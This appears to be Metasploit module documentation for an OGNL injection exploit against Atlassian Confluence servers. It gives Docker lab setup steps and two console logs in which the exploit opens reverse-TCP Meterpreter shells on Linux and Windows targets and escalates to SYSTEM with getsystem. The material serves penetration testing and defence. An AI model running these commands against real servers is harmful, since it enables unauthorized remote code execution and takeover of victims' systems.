## Vulnerable Application
This module exploits an OGNL injection in Atlassian Confluence servers. A specially crafted URI can be used to evaluate
an OGNL expression resulting in OS command execution.

Confluence versions up to and including 7.18 are vulnerable to this OGNL injection flaw. For more complete information
on affected and fixed versions, see [CONFSERVER-79000][1].

### Setup

1. Create a new `docker-compose.yml` file with the contents below.
2. Startup the container using `docker-compose up`
3. Navigate to the HTTP service running on port 8090
4. Acquire and provide an evaluation license
5. When prompted, setup a standalone / non-clustered system
6. Configure the database settings
    1. Select "By connection string", then Database URL: `jdbc:postgresql://postgresql:5432/confdb`
    2. Username and password are both `confdb`
7. Setup takes a few minutes
8. When prompted, select "Empty Site"
9. Select "Manage users and groups within Confluence"
10. Create an account, it **will not** be needed for exploitation
11. Once setup has completed select "Start" and set a space name to something

#### Docker Compose File

```
version: '3'

services:
  postgresql:
    image: postgres:11
    environment:
      POSTGRES_DB: confdb
      POSTGRES_USER: confdb
      POSTGRES_PASSWORD: confdb
    ports:
      - '5432:5432'

  confluence-server:
    depends_on:
      - postgresql
    image: atlassian/confluence:7.13.0
    ports:
      - '8090:8090'
      - '8091:8091'
```

## Verification Steps

1. Follow the steps from the Setup section to create a test instance
2. Start msfconsole
3. Run: `use exploit/multi/http/atlassian_confluence_namespace_ognl_injection`
4. Set the `RHOSTS`, `PAYLOAD` and payload-related options
5. Run the module

## Options

## Scenarios

### Confluence 7.13.0 in [Docker]

```
msf6 exploit(multi/http/atlassian_confluence_namespace_ognl_injection) > set RHOSTS 192.168.159.100
RHOSTS => 192.168.159.100
msf6 exploit(multi/http/atlassian_confluence_namespace_ognl_injection) > set PAYLOAD cmd/unix/python/meterpreter/reverse_tcp
PAYLOAD => cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(multi/http/atlassian_confluence_namespace_ognl_injection) > set LHOST 192.168.159.128
LHOST => 192.168.159.128
msf6 exploit(multi/http/atlassian_confluence_namespace_ognl_injection) > check
[+] 192.168.159.100:8090 - The target is vulnerable. Successfully tested OGNL injection.
msf6 exploit(multi/http/atlassian_confluence_namespace_ognl_injection) > exploit

[*] Started reverse TCP handler on 192.168.159.128:4444 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Executing cmd/unix/python/meterpreter/reverse_tcp (Unix Command)
[*] Sending stage (40132 bytes) to 192.168.159.100
[*] Meterpreter session 1 opened (192.168.159.128:4444 -> 192.168.159.100:42050) at 2022-06-03 17:14:41 -0400

meterpreter > getuid
Server username: confluence
meterpreter > sysinfo
Computer        : 5052c5eebf8a
OS              : Linux 5.15.0-35-generic #36-Ubuntu SMP Sat May 21 02:24:07 UTC 2022
Architecture    : x64
System Language : en_US
Meterpreter     : python/linux
meterpreter > 
```

### Confluence 7.17.2 on Windows Server 2019

```
msf6 > use exploit/multi/http/atlassian_confluence_namespace_ognl_injection
[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(multi/http/atlassian_confluence_namespace_ognl_injection) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 exploit(multi/http/atlassian_confluence_namespace_ognl_injection) > set TARGET Windows\ Command 
TARGET => Windows Command
msf6 exploit(multi/http/atlassian_confluence_namespace_ognl_injection) > set PAYLOAD cmd/windows/powershell/x64/meterpreter/reverse_tcp
PAYLOAD => cmd/windows/powershell/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/atlassian_confluence_namespace_ognl_injection) > set LHOST 192.168.159.128
LHOST => 192.168.159.128
msf6 exploit(multi/http/atlassian_confluence_namespace_ognl_injection) > exploit

[*] Started reverse TCP handler on 192.168.159.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Successfully tested OGNL injection.
[*] Executing cmd/windows/powershell/x64/meterpreter/reverse_tcp (Windows Command)
[*] Sending stage (200774 bytes) to 192.168.159.10
[*] Meterpreter session 1 opened (192.168.159.128:4444 -> 192.168.159.10:49943) at 2022-06-15 17:22:07 -0400

meterpreter > sysinfo
Computer        : WIN-3MSP8K2LCGC
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : MSFLAB
Logged On Users : 9
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
meterpreter > getsystem
...got system via technique 4 (Named Pipe Impersonation (RPCSS variant)).
meterpreter > 
```

[1]: https://jira.atlassian.com/browse/CONFSERVER-79000?src=confmacro
